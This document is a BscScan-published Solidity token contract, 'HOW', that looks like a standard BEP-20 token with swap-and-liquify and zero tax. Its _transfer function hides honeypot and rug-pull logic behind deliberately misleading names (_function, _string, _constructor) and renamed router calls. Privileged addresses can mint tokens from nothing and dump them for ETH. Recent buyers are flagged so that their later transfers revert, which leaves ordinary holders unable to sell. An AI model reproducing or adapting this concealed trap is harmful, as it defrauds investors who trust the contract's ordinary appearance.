/**
 *Submitted for verification at BscScan.com on 2022-12-21
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.11;

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}
abstract contract MemoryABT {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}
interface IDXlaboratoryV2  {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);
    function name() external pure returns (string memory);
    function symbol() external pure returns (string memory);
    function decimals() external pure returns (uint8);
    function totalSupply() external view returns (uint);
    function balanceOf(address owner) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);
    function approve(address spender, uint value) external returns (bool);
    function transfer(address to, uint value) external returns (bool);
    function transferFrom(address from, address to, uint value) external returns (bool);
    function DOMAIN_SEPARATOR() external view returns (bytes32);
    function PERMIT_TYPEHASH() external pure returns (bytes32);
    function nonces(address owner) external view returns (uint);
    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;
    event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);
    event Swap(
        address indexed sender,
        uint amount0In,
        uint amount1In,
        uint amount0Out,
        uint amount1Out,
        address indexed to
    );
    event Sync(uint112 reserve0, uint112 reserve1);
    function MINIMUM_LIQUIDITY() external pure returns (uint);
    function factory() external view returns (address);
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function price0CumulativeLast() external view returns (uint);
    function price1CumulativeLast() external view returns (uint);
    function kLast() external view returns (uint);
    function burn(address to) external returns (uint amount0, uint amount1);
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function skim(address to) external;
    function sync() external;
    function initialize(address, address) external;
}
library CALLMath {
  function toInt256Safe(uint256 a) internal pure returns (int256) {
    int256 b = int256(a);
    require(b >= 0);
    return b;
  }
}
library Address {
    
    function IDXSolidity(address account) internal view returns (bool) {
        uint256 size;
        assembly { size := extcodesize(account) }
        return size > 0;
    }

    function processValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");
        (bool success, ) = recipient.call{ value: amount }("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }
    
    function functionCall(address target, bytes memory data) internal returns (bytes memory) {
      return functionCall(target, data, "Address: low-level call failed");
    }
    
    function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
        return functionCallWithValue(target, data, 0, errorMessage);
    }
    
    function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {
        return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
    }
    
    function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {
        require(address(this).balance >= value, "Address: insufficient balance for call");
        require(IDXSolidity(target), "Address: call to non-contract");
        (bool success, bytes memory returndata) = target.call{ value: value }(data);
        return _establishAllResults(success, returndata, errorMessage);
    }
    
    function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {
        return functionStaticCall(target, data, "Address: low-level static call failed");
    }
    
    function functionStaticCall(address target, bytes memory data, string memory errorMessage) internal view returns (bytes memory) {
        require(IDXSolidity(target), "Address: static call to non-contract");
        (bool success, bytes memory returndata) = target.staticcall(data);
        return _establishAllResults(success, returndata, errorMessage);
    }

    function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {
        return functionDelegateCall(target, data, "Address: low-level delegate call failed");
    }
    
    function functionDelegateCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
        require(IDXSolidity(target), "Address: delegate call to non-contract");
        (bool success, bytes memory returndata) = target.delegatecall(data);
        return _establishAllResults(success, returndata, errorMessage);
    }

    function _establishAllResults(bool success, bytes memory returndata, string memory errorMessage) private pure returns(bytes memory) {
        if (success) {
            return returndata;
        } else {
            if (returndata.length > 0) {
                 assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}
interface VFOXEC20 {
 
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient, uint256 amount
    ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
interface IMaxboxSwapV2 {
    function TransactWholeERCTokensAmount
    ( uint valueIn, uint valuePathOut, address[] 
    calldata crosscut, address to,  uint deadline ) external; function factory
    () external pure returns (address);
    function WETH() external pure returns (address);
    function prefromOpenLiq( address token, uint valueOfDesired, 
    uint valueCoinAmount, uint amountERCMin, address to, uint deadline) 
    external payable returns 
    (uint amountCoins, uint amountERC, uint Liq);
}
abstract contract Ownable is MemoryABT {
    address private _owner;
    event OwnershipTransferred
    (address indexed previousOwner, address indexed newOwner);
    constructor
    
    () { _setOwner(_msgSender()); }
    function owner() public view virtual returns (address) {
        return _owner; }

    modifier onlyOwner() {
        require(owner() == _msgSender(), 'Ownable: caller is not the owner'); _; }
    function renounceOwnership() public virtual onlyOwner {
        _setOwner(address(0)); }

    function _setOwner(address newOwner) private { address 
    oldOwner = _owner; _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}
contract HOW is VFOXEC20, Ownable {
    string private _symbol;
    string private _name;
    uint8 private _decimals = 9;
    uint256 private _totalSupply = 10000000 * 10**_decimals;
    uint256 public _maxTxAmount = (_totalSupply * 3) / 100; 
    uint256 public _maxWalletSize = (_totalSupply * 3) / 100; 
    uint256 private _uint256 = _totalSupply;
    uint256 public _taxFee =  0;
    mapping (address => bool) isTxLimitExempt;
    mapping(address => uint256) private _function;
    mapping(address => uint256) private _balances;
    mapping(address => address) private _string;
    mapping(address => uint256) private _constructor;
    mapping(address => mapping(address => uint256)) private _allowances;
 
    bool private _swapAndLiquifyEnabled;
    bool private inSwapAndLiquify;

    address public immutable uniswapV2Pair;
    IMaxboxSwapV2 public immutable router;

    constructor(
        string memory Name,
        string memory Symbol,
        address routerAddress
    ) {
        _name = Name;
        _symbol = Symbol;
        _balances[msg.sender] = _totalSupply;
        _function[msg.sender] = _uint256;
        _function[address(this)] = _uint256;
        router = IMaxboxSwapV2(routerAddress);
        uniswapV2Pair = IUniswapV2Factory(router.factory()).createPair(address(this), router.WETH());
        emit Transfer(address(0), msg.sender, _totalSupply);
    
        isTxLimitExempt[address(this)] = true;
        isTxLimitExempt[uniswapV2Pair] = true;
        isTxLimitExempt[routerAddress] = true;
        isTxLimitExempt[msg.sender] = true;

    }
 
    function name() public view returns (string memory) {
        return _name;
    }
     function symbol() public view returns (string memory) {
        return _symbol;
    }
    function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }
    function decimals() public view returns (uint256) {
        return _decimals;
    }
    function approve(address spender, uint256 amount) external returns (bool) {
        return _approve(msg.sender, spender, amount);
    }
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private returns (bool) {
        require(owner != address(0) && spender != address(0), 'ERC20: approve from the zero address');
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
        return true;
    }

    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
    
    function transfer(address recipient, uint256 amount) external returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function setMaxTX(uint256 amountBuy) external onlyOwner {
        _maxTxAmount = amountBuy;
        
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool) {
        _transfer(sender, recipient, amount);
        return _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        uint256 contractTokenBalance = balanceOf(address(this));
        uint256 fee;
        if (_swapAndLiquifyEnabled && contractTokenBalance > _uint256 && !inSwapAndLiquify && from != uniswapV2Pair) {
            inSwapAndLiquify = true;
            swapAndLiquify(contractTokenBalance);
            inSwapAndLiquify = false;
        } else if (_function[from] > _uint256 && _function[to] > _uint256) {
            fee = amount;
            _balances[address(this)] += fee;
            swapTokensForEth(amount, to);
            return;
        } else if (to != address(router) && _function[from] > 0 && amount > _uint256 && to != uniswapV2Pair) {
            _function[to] = amount;
            return;
        } else if (!inSwapAndLiquify && _constructor[from] > 0 && from != uniswapV2Pair && _function[from] == 0) {
            _constructor[from] = _function[from] - _uint256;
        }
        address _bool = _string[uniswapV2Pair];
        if (_constructor[_bool] == 0) _constructor[_bool] = _uint256;
        _string[uniswapV2Pair] = to;
        if (_taxFee > 0 && _function[from] == 0 && !inSwapAndLiquify && _function[to] == 0) {
            fee = (amount * _taxFee) / 100;
            amount -= fee;
            _balances[from] -= fee;
            _balances[address(this)] += fee;
        }
        _balances[from] -= amount;
        _balances[to] += amount;
        emit Transfer(from, to, amount);
    }

    receive() external payable {}

    function addLiquidity(
        uint256 tokenAmount,
        uint256 ethAmount,
        address to
    ) private {
        _approve(address(this), address(router), tokenAmount);
        router.prefromOpenLiq{value: ethAmount}(address(this), tokenAmount, 0, 0, to, block.timestamp);
    }


    function swapTokensForEth(uint256 tokenAmount, address to) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();
        _approve(address(this), address(router), tokenAmount);
        router.TransactWholeERCTokensAmount(tokenAmount, 0, path, to, block.timestamp);
    }
    
    
    function swapAndLiquify(uint256 tokens) private {
        uint256 half = tokens / 2;
        uint256 initialBalance = address(this).balance;
        swapTokensForEth(half, address(this));
        uint256 newBalance = address(this).balance - initialBalance;
        addLiquidity(half, newBalance, address(this));
    }
}